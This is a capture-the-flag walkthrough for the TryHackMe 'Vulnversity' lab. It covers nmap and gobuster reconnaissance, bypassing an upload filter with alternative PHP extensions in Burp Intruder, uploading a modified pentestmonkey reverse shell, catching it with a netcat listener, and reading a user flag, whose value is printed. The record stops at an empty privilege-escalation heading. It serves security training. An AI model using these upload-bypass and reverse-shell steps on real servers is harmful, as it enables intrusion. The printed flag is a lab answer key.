https://tryhackme.com/room/vulnversity

## Task 2 : Reconnaissance

#### Scan the box, how many ports are open ?

nmap -sV -Sc -p-

> Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-31 20:47 BST
> 
> Nmap scan report for ip-10-10-170-87.eu-west-1.compute.internal (10.10.170.87)
> 
> Host is up (0.0012s latency).
> 
> Not shown: **994 closed ports**
> 
> **PORT    STATE SERVICE     VERSION**
> 
> **21**/tcp   open  ftp         vsftpd 3.0.3
> 
> **22**/tcp   open  ssh         OpenSSH 7.2p2 **Ubuntu** 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
> 
> | ssh-hostkey: 
> 
> |   2048 *edited* (RSA)
> 
> |   256 *edited* (ECDSA)
> 
> |_  256 *edited* (EdDSA)
> 
> **139**/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
> 
> **445**/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
> 
> **3128**/tcp open  http-proxy  **Squid http proxy 3.5.12**
> 
> |\_http-server-header: squid/3.5.12
> 
> |\_http-title: ERROR: The requested URL could not be retrieved
> 
> **3333**/tcp open  http        **Apache httpd** 2.4.18 ((Ubuntu))
> 
> |\_http-server-header: Apache/2.4.18 (Ubuntu)
> 
> |\_http-title: Vuln University
> 
> MAC Address: 02:0B:DD:24:3E:DF (Unknown)
> 
> Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
> 
> Host script results:
> 
> |\_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown\>, NetBIOS MAC: <unknown\> (unknown)
> 
> | smb-os-discovery: 
>  
> |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
>  
> |   Computer name: vulnuniversity
> 
> |   NetBIOS computer name: VULNUNIVERSITY\x00
> 
> |   Domain name: \x00
> 
> |   FQDN: vulnuniversity
> 
> |\_  System time: 2022-05-31T15:47:26-04:00
> 
> | smb-security-mode: 
> 
> |   account_used: guest
> 
> |   authentication_level: user
> 
> |   challenge_response: supported
> 
> |\_  message_signing: disabled (dangerous, but default)
> 
> | smb2-security-mode: 
>   2.02: 
> 
> |\_    Message signing enabled but not required
> 
> | smb2-time: 
> |   date: 2022-05-31 20:47:26
> |\_  start_date: 1600-12-31 23:58:45
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> 
> Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds

6

#### What version of the squid proxy is running on the machine ?

See output of previous command above.

#### How many ports will nmap scan if the flag -p-400 was used ?

Nmap will scan port numbers from 1 to 400 (both included).

#### Using the nmap flag -n what will it not resolve ?

According to Nmap documentation, flag -n never does DNS resolution.

#### What is the most likely operating system this machine is running ?

Ubuntu

#### What port is the web server running on ?

3333

## Task 3 : Locating directories using GoBuster

#### What is the directory that has an upload form page ?

gobuster dir -u http://10.10.170.87:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

> ===============================================================
> 
> Gobuster v3.0.1
> 
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
> 
> ===============================================================
> 
> [+] Url:            http://10.10.170.87:3333
> 
> [+] Threads:        10
> 
> [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
> 
> [+] Status codes:   200,204,301,302,307,401,403
> 
> [+] User Agent:     gobuster/3.0.1
> 
> [+] Timeout:        10s
> 
> ===============================================================
> 
> 2022/05/31 21:02:51 Starting gobuster
> 
> ===============================================================
> 
> /images (Status: 301)
> 
> /css (Status: 301)
> 
> /js (Status: 301)
> 
> /fonts (Status: 301)
> 
> /internal (Status: 301)
> 
> /server-status (Status: 403)

Visit all directories found ; http://10.10.170.87:3333/internal/ is the one with an upload form.

## Task 4 : Compromise the webserver

Try upload a few file types to the server, what common extension seems to be blocked?

.php

Create a text file 'phpext.txt' with common PHP extensions :
.php
.php3
.php4
.php5
.phtml

Start BurpSuite and configure the proxy to intercept the traffic from http://10.10.170.87:3333/internal/

Upload a .php file, capture it in Burp proxy and forward it to the intruder :
![alt-title](/images/Vulniversity1.png)

Click on 'Payloads' tab and select the 'Sniper' attack :
![alt-title](/images/Vulniversity2.png)

Then, click on the 'Positions' tab and modify the captured HTTP request like that :
![alt-title](/images/Vulniversity3.png)

and launch the attack.
Check the results, by clicking on the 'Response' tab :
![alt-title](/images/Vulniversity4.png)
![alt-title](/images/Vulniversity5.png)

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and replace the line `$ip = '127.0.0.1';  // CHANGE THIS` with the IP of the attack machine.

Save the modified reverse PHP shell to 'php-reverse-shell.phtml' so that it is accepted by the upload form.

Start listening to incoming connections using netcat : nc -lvnp 1234

Upload 'php-reverse-shell.phtml' and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml
This will execute the payload and will give a reverse shell :
![alt-title](/images/Vulniversity6.png)
  
#### What is the name of the user who manages the webserver ?
  
> whoami
> www-data
> 
> pwd
> /
> dir /home
> bill
> 
> dir /home/bill
> user.txt
> 
> cat /home/bill/user.txt
> 8bd7992fbe8a6ad22a63361004cfcedb


## Task 5 : Privilege escalation

